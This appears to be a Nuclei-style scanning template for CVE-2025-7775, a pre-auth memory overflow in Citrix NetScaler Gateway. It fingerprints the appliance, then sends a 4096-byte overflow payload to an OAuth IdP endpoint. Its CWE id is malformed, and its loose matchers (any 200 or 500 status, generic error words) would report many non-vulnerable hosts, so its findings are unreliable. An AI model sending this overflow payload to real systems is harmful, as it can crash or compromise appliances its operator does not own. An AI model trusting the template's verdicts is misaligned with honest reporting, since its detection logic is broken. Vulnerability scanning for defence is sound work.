id: CVE-2025-7775

info:
  name: Citrix NetScaler - Memory Overflow RCE
  author: Trex
  severity: critical
  description: >
    Memory overflow in Citrix NetScaler ADC/Gateway leading to pre-auth RCE.
    Targets Gateway/AAA virtual servers. Actively exploited zero-day.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2025-7775
  classification:
    cvss-score: 9.2
    cve-id: CVE-2025-7775
    cwe-id: CWE-11901280128
  metadata:
    max-request: 2
  tags: cve,cve2025,citrix,netscaler,rce,memory-overflow,unauth

variables:
  overflow_data: "{{repeat('A', 4096)}}"

http:
  - raw:
      - |
        GET /vpn/index.html HTTP/1.1
        Host: {{Hostname}}

      - |
        POST /oauth/idp/.well-known/openid_configuration HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 4096

        {{overflow_data}}

    matchers-condition: and
    matchers:
      - type: word
        part: body_1
        words:
          - "NetScaler Gateway"
          - "Citrix Gateway"
          - "NetScaler AAA"
        condition: or

      - type: status
        status:
          - 200
          - 500
          - 502

      - type: word
        part: body_2
        words:
          - "memory"
          - "overflow"
          - "Internal Server Error"
          - "Bad Gateway"
        condition: or

    extractors:
      - type: regex
        part: body_1
        group: 1
        regex:
          - "NetScaler Build ([0-9.-]+)"
          - "Version ([0-9.-]+)"